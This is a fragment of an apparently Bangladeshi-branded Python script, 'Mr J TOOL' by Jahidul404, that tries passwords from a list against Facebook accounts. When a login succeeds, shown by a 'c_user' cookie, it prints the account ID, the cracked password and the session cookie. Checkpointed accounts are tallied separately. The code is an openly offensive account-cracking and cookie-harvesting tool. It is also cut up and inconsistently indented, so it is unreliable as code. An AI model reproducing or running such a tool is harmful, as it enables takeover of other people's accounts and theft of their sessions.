...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] Facebook MY Acaund ')
    print(' [2] EXIT')
...
\033[1;32m     \033[1;35mGITHUB      :  \033[1;35m    Jahidul404
\033[1;32m     \033[1;36mSTATUS      :  \033[1;36m IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m   Mr J
\033[1;32m     \033[1;36m VIRSION   :  \033[1;36m4.3.0
\033[1;37m======== \33[32;45mJahidul\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO Mr J TOOL\33[0;m 
\033[1;37m================== \33[32;45mMr J\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(Jahidul -OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(Jahidul-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[Jahidul] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
